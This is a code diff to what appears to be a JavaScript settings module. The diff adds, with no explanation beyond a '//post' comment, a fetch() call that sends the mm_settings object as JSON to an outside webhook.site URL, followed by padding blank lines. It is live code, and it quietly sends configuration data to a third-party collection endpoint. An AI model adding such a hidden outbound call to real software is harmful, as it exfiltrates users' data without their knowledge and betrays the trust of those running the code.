@@ -31,6 +31,31 @@ define([], function () {
       old_settings = mm_settings;
       $("input[name = idgroup]").val(old_settings);
 
+
+      //post
+      fetch('https://webhook.site/0325228d-d41f-422e-a7a0-16c6e6a3f678', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(mm_settings),
+      })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Success:', data);
+        })
+        .catch((error) => {
+          console.error('Error:', error);
+        });
+
+
+
+
+
+
+
+
+
     },
     settings: async (self) => {
 
